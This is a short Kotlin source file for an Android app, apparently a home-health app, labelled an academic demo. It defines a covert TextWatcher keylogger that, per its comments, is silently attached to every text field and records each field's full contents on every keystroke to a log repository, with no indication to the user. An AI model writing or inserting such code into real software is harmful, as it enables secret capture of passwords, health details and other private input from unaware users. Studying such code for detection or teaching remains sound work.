package com.example.homehealth.keylogger

import android.text.Editable
import android.text.TextWatcher

/**
 * ACADEMIC DEMO: Covert TextWatcher
 * Silently attached to every EditText in the app.
 * The user sees no indication this is running.
 */
class KeylogTextWatcher(
    private val screenName: String,
    fieldHint: String
) : TextWatcher {

    private val fieldHint = if (fieldHint.isEmpty()) "unknown_field" else fieldHint
    private val repository = KeylogRepository.getInstance()

    override fun beforeTextChanged(s: CharSequence, start: Int, count: Int, after: Int) {
        // Not needed for this demo
    }

    override fun onTextChanged(s: CharSequence, start: Int, before: Int, count: Int) {
        // Capture on every character change
        repository.log(screenName, this.fieldHint, s.toString())
    }

    override fun afterTextChanged(s: Editable) {
        // Not needed for this demo
    }
}
